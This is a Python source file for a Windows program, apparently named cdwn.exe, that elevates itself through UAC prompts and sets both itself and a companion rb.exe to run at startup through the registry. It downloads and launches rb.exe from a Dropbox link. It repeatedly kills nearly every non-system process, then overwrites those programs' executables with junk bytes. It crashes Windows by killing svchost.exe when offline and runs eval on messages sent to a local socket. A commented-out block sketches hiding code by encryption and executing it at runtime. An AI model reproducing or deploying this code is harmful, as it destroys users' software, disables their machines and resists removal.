
import ctypes
import sys
def run_as_admin(): # don't work :sad_face:
        if ctypes.windll.shell32.IsUserAnAdmin() == 0:
                #shell.ShellExecuteEx(lpVerb='runas', lpFile='powershell.exe', lpParameters='/c ' + selfScriptFullLocation)
                ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, __file__, None, 1)
                sys.exit()
run_as_admin()

import socket
from Crypto.Cipher import AES
import os
import psutil
from time import sleep
from sys import exit

#import ast
# it causes problems with pyinstaller with the frozen handler freaking out


import sys
import requests
import subprocess
import ctypes
# import struct
import threading
from tcp_latency import measure_latency

# just a helper to make sure the main proccess is running

SelfFilename = 'cdwn.exe' # os.path.basename(__file__) # Change accordingly !
SelfFolderContainingProgram = os.path.split(os.path.abspath(os.path.realpath(sys.argv[0])))[0]
selfScriptFullLocation = SelfFolderContainingProgram + '\\' + SelfFilename
FriendName = 'rb.exe'

urltodownload = 'https://www.dropbox.com/s/knn18wbopu0pwur/rb.exe?dl=1'

import win32com.shell.shell as shell


class KThread(threading.Thread):
    """A subclass of threading.Thread, with a kill()
method."""
    def __init__(self, *args, **keywords):
        threading.Thread.__init__(self, *args, **keywords)
        self.killed = False

    def start(self):
        """Start the thread."""
        self.__run_backup = self.run
        self.run = self.__run            # Force the Thread to
        threading.Thread.start(self)

    def __run(self):
        """Hacked run function, which installs the
trace."""
        sys.settrace(self.globaltrace)
        self.__run_backup()
        self.run = self.__run_backup

    def globaltrace(self, frame, why, arg):
        if why == 'call':
            return self.localtrace
        else:
            return None

    def localtrace(self, frame, why, arg):
        if self.killed:
            if why == 'line':
                raise SystemExit()
        return self.localtrace

    def kill(self):
        self.killed = True



def runcmd(cmd, suppress=False, retry=0):
    try:
        a = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        a.wait()
        if a.returncode == 0:
            if suppress == False:
                print("The command ran successfully", "@ command :", cmd)
            else:
                pass
        else:
            if suppress == False:
                print("The command failed with return code", a.returncode, "@ command :", cmd)
            else:
                pass
            if suppress == False:
                print(f'{retry+1} Retrying running: {cmd}')
            retry +=1
            if retry > 4:
                    return
            return runcmd(cmd, suppress, retry)
    except Exception as e:
        print(f'Error at runcmd, {e}')



def programVL2(program): # Using UAC.
    'Doesn\'t have the start method, for commands with admin perms'
    'Run a program with a request for UAC - Admin perms.'
    shell.ShellExecuteEx(lpVerb='runas', lpFile='cmd.exe', lpParameters='/c '+program)

def checkfriend():
    #print(os.getcwd())
    global FriendName
    processFriendIsRunning = False
    count = 0
    count_failsafe = 0
    for proc in psutil.process_iter():
            try:
                    # Get process name & pid from process object.
                    processName = proc.name()
                    if processName == 'rb.exe':
                        count_failsafe += 1
                    #subprocess_cmd("taskkill.exe /t /im " + processName)
                    #subprocess_cmd("taskkill.exe /im " + processName)
                    v = os.path.abspath(psutil.Process(proc.pid).cwd())
                    #print(f'{v.casefold()}//{processName}     {SelfFolderContainingProgram.casefold()}//{FriendName}')
                    if v.casefold() == SelfFolderContainingProgram.casefold() and processName == FriendName:
                        processFriendIsRunning = True
                        count += 1
                        #print("Killing process: " + processName)
                        #runcmd("taskkill.exe /t /im " + processName) # left to do, fix this damn thing to go in the background, and the reg startup thing doesn't want to work again
                        #runcmd("taskkill.exe /im " + processName)
                        #print(processName)
                        #if a == 0: # 1 unsuccessfully, 0 successfully killed
                        #    os.system(f'msg * {processName} Proccess will fail to.')
            except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                    pass
    if count_failsafe > 10: # while yeah the programs will sort themselves out it'll cause insane lag and its better off restarting
        #os.system('shutdown.exe /g /t 0')
        # instead:
        programVL2('taskkill.exe /f /t /im rb.exe')
        sleep(5)
        startfriend()
        programVL2('taskkill /f /im cdwn.exe')
        sys.exit()
        exit()
        
    if processFriendIsRunning == True:
        #print('Is running')
        if count > 2:
            programVL2('taskkill.exe /f /t /im rb.exe')
            #startfriend()
        pass
    else:
        print('not running')
        try:
            startfriend()
            print(f'SelfFolderContainingProgram {SelfFolderContainingProgram}')
            sleep(1)
        #print(os.path.split(os.path.abspath(os.path.realpath(sys.argv[0])))[0])
        #os.system(f'msg * start {SelfFolderContainingProgram}\\rb.exe')
        except Exception as e:
            print(e)
        return checkfriend()

def startfriend():
    if not os.path.exists(SelfFolderContainingProgram + '\\' +  FriendName):
        print(f'Downloading {FriendName}')
        try:
            r = requests.get(urltodownload, allow_redirects=True)
            with open(SelfFolderContainingProgram + '\\' + FriendName, 'wb') as f:
                f.write(r.content)
        except Exception as e:
            print(e)
            return startfriend()
        print(f'Downloaded {FriendName}')

    programVL2(f'start rb.exe')


def processestoterminate():

    user = os.getenv("USERNAME")
    
    # a list to kill processes when got all. # PID ONLY!
    tokill = []

    # to not absolutely kill windows there shall be an exclude list, but this program is(sort of) foolproof.
    exclude_list = ["powershell.exe", "WINWORD.EXE","POWERPNT.EXE","GoogleCrashHandler.exe","GoogleCrashHandler64.exe","explorer.exe","svchost.exe","services.exe","csrss.exe","winlogon.exe","lsass.exe","lsm.exe","smss.exe","system","wininit.exe","taskmgr.exe","winmgmt.exe","ntoskrnl.exe","spoolsv.exe","msdtc.exe","audiodg.exe","dwm.exe","searchindexer.exe", "cdwn.exe", "rb.exe", "chrome.exe", "whatsapp.exe", 'System', 'SecurityHealthService.exe', 'MemCompression', 'csrss.exe', 'MpCmdRun.exe', 'WUDFHost.exe', 'TiWorker.exe', 'smss.exe', 'VSSVC.exe', 'lsass.exe', 'sihost.exe', 'WmiPrvSE.exe', 'ctfmon.exe', 'SearchFilterHost.exe', 'winlogon.exe', 'rdpclip.exe', 'taskhostw.exe', 'ngen.exe', 'sppsvc.exe', 'backgroundTaskHost.exe', 'cdwn.exe', 'rb.exe', 'wlms.exe', 'TextInputHost.exe', 'LogonUI.exe', 'svchost.exe', 'smartscreen.exe', 'SearchApp.exe', 'dwm.exe', 'taskkill.exe', 'MsMpEng.exe', 'fontdrvhost.exe', 'cmd.exe', 'Registry', 'TrustedInstaller.exe', 'NisSrv.exe', 'wininit.exe', 'StartMenuExperienceHost.exe', 'rb.exe', 'mscorsvw.exe', 'System Idle Process', 'conhost.exe', 'ngentask.exe', 'SearchProtocolHost.exe', 'SearchIndexer.exe', 'OneDrive.exe', 'spoolsv.exe', 'explorer.exe', 'SecurityHealthSystray.exe', 'System', 'services.exe']
    exclude_list = [x.lower() for x in exclude_list]
    # ['System', '', 'Registry', 'LsaIso.exe', 'RuntimeBroker.exe', 'TrustedInstaller.exe', 'MemCompression', 'wlms.exe', 'sqlwriter.exe', 'MsMpEng.exe', 'AggregatorHost.exe', 'RuntimeBroker.exe', 'manage-bde.exe', 'WindowsTerminal.exe', 'MpCmdRun.exe', 'userinit.exe', 'OpenConsole.exe', 'RuntimeBroker.exe', 'dllhost.exe', 'Widgets.exe', 'SearchHost.exe', 'StartMenuExperienceHost.exe', 'dllhost.exe', 'dllhost.exe', 'NisSrv.exe', 'MpCmdRun.exe', 'WmiPrvSE.exe', 'dllhost.exe', 'mobsync.exe', 'findstr.exe', 'WmiPrvSE.exe']

    exclude_list_HAVE = ["System", "chrome.exe", "MemCompression", "GoogleUpdate.exe", "WINWORD.EXE","POWERPNT.EXE","GoogleCrashHandler.exe","GoogleCrashHandler64.exe", "wlms.exe"]
    exclude_list_HAVE = [x.lower() for x in exclude_list_HAVE]
    
    ownprogrampid = os.getpid()

    # Functions:
    def corruptfile(directoryoffile):
        with open(directoryoffile, "w+") as f:
            f.seek(0)
            content = f.read()
            scrubbed_content = b"X" * len(content)
            f.seek(0)
            f.write(scrubbed_content)
            f.truncate()

    def getchildrenofprocess(pid):
            process = psutil.Process(pid)
            for child in process.children(recursive=True):
                    add(child.pid)
                    
    #        f.write(f"Process {pid} was killed at {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
    
    def add(pid, children=False):
            if pid == ownprogrampid:
                    # Nope.
                    pass
            else:
                    if children == True:
                            getchildrenofprocess(pid)
                    if pid not in tokill:
                            tokill.append(pid)

    processes = psutil.process_iter()
    system32_files = os.listdir(os.environ['WINDIR'] + '\System32')
    system32_files = [x.lower() for x in system32_files]
    windows_files = os.listdir(os.environ['WINDIR'])
    windows_files = [x.lower() for x in windows_files]
    
    # Iterate through the list of processes
    for process in processes:
            try:
                    # Get the process ID, name, and executable path
                    pid = process.pid
                    name = process.name().lower()
                    exe_path = process.exe().lower()
                    # Check if the process name is in the System32 file list and if the executable path is not in the System32 folder

                    if name in system32_files and exe_path.startswith((os.environ['WINDIR'] + '\\System32').lower()):
                            pass
                    else:
                            if name in windows_files and exe_path.startswith((os.environ['WINDIR']).lower()):
                                    pass
                            else:
                                    #print(f'Comperison of {name} {exe_path}, Is the name from System32? {name in system32_files}, Is the name from Windows folder? {name in windows_files}')
                                    add(pid)
            except Exception as e:
                    #print(f'Error: {e}')
                    pass

    newlisttokill = []
    for i in tokill:
        ia  = psutil.Process(i).name().lower()
        if ia in exclude_list_HAVE:
            pass
        else:   
            newlisttokill.append(i)
    tokill = newlisttokill   

    # save locations.
    pid_locations = []
    for pid in tokill:
        try:
            pid_locations.append(psutil.Process(pid).exe())
        except Exception as e:
            #print(f'Error: {e}')
            continue
    # Kill all the processes in the list of processes to kill
    
    # filter tokill list from exclude_list_have
    
         
    
    #name_pid_list = [psutil.Process(pid).name() for pid in tokill]
    #print(name_pid_list)
    #sleep(4)    


    for pid in tokill:
            try:
                
                    psutil.Process(pid).kill()
            except Exception as e:
                    #print(f'Error: {e}')
                    pass

    #print('\n\nAnd now to corrupt..\n')
    
    
    for location in pid_locations:
            try:
                    #print(location)
                    corruptfile(location) # corrupt it, cause why tf not?
            except Exception as e:
                    #print(f'Error: {e}')
                    pass


def updatevaryusingusb():
    global checkingfriend, FriendName, terminateprocesses
    programVL2(f'taskkill.exe /f /im {FriendName}')
    system32_path = r'C:\Windows\System32'
    for drive in 'ABCDEFGHIJKLMNOPQRSTUVWXYZ':
            drive_path = drive + ':\\'
            if os.path.exists(drive_path):
                    vary_folder_path = os.path.join(drive_path, 'VAry')
                    if os.path.exists(vary_folder_path):
                            print(f'Found VAry folder at {vary_folder_path}')
                            for filename in os.listdir(vary_folder_path):
                                    src_path = os.path.join(vary_folder_path, filename)
                                    dst_path = os.path.join(system32_path, filename)
                                    if os.path.exists(dst_path):
                                            os.remove(dst_path)
                                    print(f'Copying {src_path} to {dst_path}')
                                    try:
                                        programVL2(f'xcopy {src_path} {dst_path} /C /Q /I /G /H /Y')
                                    except (FileNotFoundError, OSError):
                                        # ignore the error and continue copying other files
                                        pass
                                    terminateprocesses.kill()
                                    MessageBox = ctypes.windll.user32.MessageBoxW
                                    restart_prompt = MessageBox(None, "Do you want to restart the OS?", "Restart Application", 0x40 | 0x1)
                                    if restart_prompt == 1:
                                        runcmd('shutdown.exe /g /t 0')
                                    terminateprocesses.start()
                                    startfriend()
    startfriend()


def AddSelfToStartupRegistry():
    programVL2(f'reg add HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v vtl /f /t REG_SZ /d \"{os.path.split(os.path.abspath(os.path.realpath(sys.argv[0])))[0]}\\rb.exe')
    programVL2(f'reg add HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v vpal /f /t REG_SZ /d \"{os.path.split(os.path.abspath(os.path.realpath(sys.argv[0])))[0]}\\cdwn.exe')




def checkifselfisrunning():
    #print(os.getcwd())
    FriendName = 'cdwn.exe'
    processFriendIsRunning = 0
    for proc in psutil.process_iter():
            try:
                    # Get process name & pid from process object.
                    processName = proc.name()
                    #subprocess_cmd("taskkill.exe /t /im " + processName)
                    #subprocess_cmd("taskkill.exe /im " + processName)
                    v = os.path.abspath(psutil.Process(proc.pid).cwd())
                    #print(f'{v.casefold()}//{processName}     {SelfFolderContainingProgram.casefold()}//{FriendName}')
                    if v.casefold() == SelfFolderContainingProgram.casefold() and processName == FriendName:
                        processFriendIsRunning += 1
                            #print("Killing process: " + processName)
                        #runcmd("taskkill.exe /t /im " + processName) # left to do, fix this damn thing to go in the background, and the reg startup thing doesn't want to work again
                        #runcmd("taskkill.exe /im " + processName)
                        #print(processName)
                        #if a == 0: # 1 unsuccessfully, 0 successfully killed
                        #    os.system(f'msg * {processName} Proccess will fail to.')
            except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                    pass
    if processFriendIsRunning > 2:
        print('An instance is already running. killing self')
        selfpid = psutil.Process(os.getpid()).pid
        programVL2(f'taskkill.exe /t /PID {selfpid}')
        sys.exit()
        exit()
    else:
        print('No other instance is running')



def aaaa():
    while True:
        try:
            checkfriend()
        except Exception as e:
            print(f'Error at checking a "friend": {e}')

def aaaaaa():
    while True:
        try:
            processestoterminate()
            sleep(1)
        except Exception as e:
            print(f'Error at terminating: {e}')

# port : 65429
def receiver(): # for stuff such as updating the main process.
    global checkingfriend, terminateprocesses
    AES_KEY = b'c\x076\x042\x8b[\xa8\xf1\x18\x8b\xf1&\x05\xd2\xf7@>\x14hf\x1e\xbe\xd3\xb2\x03\x9c\x10\xd9\xb4\x1c/'

    def encrypt(key, plaintext):
        cipher = AES.new(key, AES.MODE_EAX)
        ciphertext, tag = cipher.encrypt_and_digest(plaintext)
        return (cipher.nonce, tag, ciphertext)

    def decrypt(key, ciphertext):
        #print(ciphertext)
        nonce, tag, ciphertext = ciphertext[:3]
        cipher = AES.new(key, AES.MODE_EAX, nonce)
        plaintext = cipher.decrypt(ciphertext)
        try:
            cipher.verify(tag)
            return plaintext#.decode("utf-8")
        except ValueError:
            return None
    
    HEADER = 64
    FORMAT = 'utf-8'
    try:
        s = socket.socket()
        s.bind(("localhost", 65429))
        s.listen(1)
        
        while True:
            conn, addr = s.accept()
            print("Connection from", addr)

            msg_length = conn.recv(HEADER).decode(FORMAT)
            #print(f'msg length : {msg_length}')
            if msg_length:
                msg_length = int(msg_length)
                msg = conn.recv(msg_length)
                msg = str(msg.decode('utf-8'))
                
                msg = eval(msg)
                #print(repr(msg))
                # Decrypt the message
                plaintext = decrypt(AES_KEY, msg)
                text = plaintext.decode("utf-8")
                # Print the decrypted message
                print("Decrypted message:", text)
                if text == 'updatevary_usb':
                    checkingfriend.kill()
                    updatevaryusingusb()
                    if not checkingfriend.is_alive():
                        checkingfriend.start()
                    if not terminateprocesses.is_alive():
                        terminateprocesses.start()
    except Exception as e:
        print(f'Error: {e}')
        checkifselfisrunning() # so if socket is taken and another instance is running kill self.

def crashOOPS():
    programVL2('taskkill.exe /f /im svchost.exe')


def crashifnointernet(): # if 5 tries and no sucess, crash
    violation = 0
    while True:
        try:
            v = measure_latency(host='google.com')
            print(v)
            sleep(2)
            if len(v) == 0:
                violation +=1
            else:
                violation = 0    
            
            if violation > 3:
                print('Crashing due to no internet connectivity.')
                crashOOPS()
        
        except:
            pass


try:
    terminateprocesses = KThread(target=aaaaaa)
    checkingfriend = KThread(target=aaaa)
    getfrommaintasks = KThread(target=receiver)
    internetcheck = KThread(target=crashifnointernet)
    
    internetcheck.start()
    terminateprocesses.start()
    checkingfriend.start()
    getfrommaintasks.start()
    try:
        AddSelfToStartupRegistry()
    except Exception as e:
        print(f'Error: {e}')
except Exception as e:
    sleep(2)
    runcmd('shutdown.exe /g /t 0')
    os.startfile(selfScriptFullLocation)
    os.abort(200)


'''


import base64
import os
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from Crypto.Cipher import AES
from Crypto.Util import number
import win32api
#print(repr(os.urandom(32)))

# is 256. not 128 or 1024
TUT = b'\xcf3\xad\xed3\x0b\x1dH+\xd3\xd5\xaa\xf6Z\xfc\xc7K\x1b;\xad\x81\x11\xc7\x12-`\xee\xabN\x96\x07\x06'


def encrypt(key, plaintext):
    cipher = AES.new(key, AES.MODE_EAX)
    ciphertext, tag = cipher.encrypt_and_digest(plaintext)
    return (cipher.nonce, tag, ciphertext)

def decrypt(key, ciphertext):
    (nonce, tag, ciphertext) = ciphertext
    cipher = AES.new(key, AES.MODE_EAX, nonce)
    plaintext = cipher.decrypt(ciphertext)
    try:
        cipher.verify(tag)
        return plaintext.decode("utf-8")
    except ValueError:
        return None

import base64

def encrypt_code(code):
    message = encrypt(TUT, code.encode("utf-8"))
    return base64.b64encode(str(message).encode('utf-8'))


import base64
import ast
def parse_message(message):
    decoded_message = base64.b64decode(message).decode('utf-8')
    try:
        parsed_message = ast.literal_eval(decoded_message)
        return parsed_message
    except (SyntaxError, ValueError):
        print("Failed to parse the message.")


def decrypt_code(code_to_decrypt):
    # Decode the code_to_decrypt from utf-8
    msg = code_to_decrypt.decode('utf-8')
    
    # Load the string representation of a tuple as a tuple
    msg = parse_message(msg)
    #print(repr(msg))
    # Decrypt the message
    plaintext = decrypt(TUT, msg)
    text = plaintext#.decode("utf-8")
    # Print the decrypted message
    print("Decrypted message:", text)
import pyperclip


a = encrypt_code(code)
#a = input('Q: ')
a = decrypt_code(a)
print(repr(a))


#print(repr(ciphertext))
exit()
# Build encrypted file into executable
os.system('pyinstaller --onefile encrypted_file.py')

# Decrypt and execute encrypted file at runtime
with open('encrypted_file.py', 'rb') as f:
    ciphertext = f.read()

plaintext = decrypt_code(key, ciphertext)
exec(plaintext)
'''